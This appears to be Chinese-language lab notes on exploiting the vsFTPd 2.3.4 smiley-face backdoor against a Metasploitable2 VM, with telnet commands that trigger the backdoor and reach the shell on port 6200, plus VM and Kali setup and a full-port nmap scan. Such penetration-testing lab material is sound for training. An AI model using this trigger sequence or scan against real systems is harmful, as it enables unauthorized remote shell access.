```bash
telnet target 21
user backdorred:)
pass invalid
# telnet 退出
quit
```

首先输入 `telnet target 21`

然后会出现 `220 (vsFTPd 2.3.4)`

紧接着手动输入 `user backdoored:)` 然后会出现 `331 Please specify the password` 的提示（笑脸后门只有这个特殊的版本拥有，这个版本出现没有多久其实就被迭代了，只是人们的手速比较快把这个版本留下来了）

紧接着手动输入 `pass invalid`

然后按下 `ctrl+]`

然后按下回车，即可出现 telnet 的 CLI 界面

然后就可以通过 `quit` 命令退出

通过该命令尝试连接 6200 端口 `telnet target 6200`

## 部署 Metashploitable2

```bash
# 启动靶机
sudo virsh start Metasploitable2
# 测试靶机是否启动
ping target
```

## 部署 Kali

```bash
docker run -ti --network host 3f457 bash
ping target
```

### nmap 扫描

```bash
nmap -p 1-65535 -T4 -A -v target > /tmp/report.txt
# -p 指定端口范围
# -T4 设定 nmap 扫描的时间策略，数字为 0-5，越大越快。扫描的越慢则越不容易被发现，也不会给目标带来太大的网络流量
# -A 同时启用操作系统指纹识别和版本检测
# -v 将会显示扫描过程中的详细信息
# >/tmp/report.txt 将输出的信息重定向到文件中，方便后续对扫描信息进行分析
```



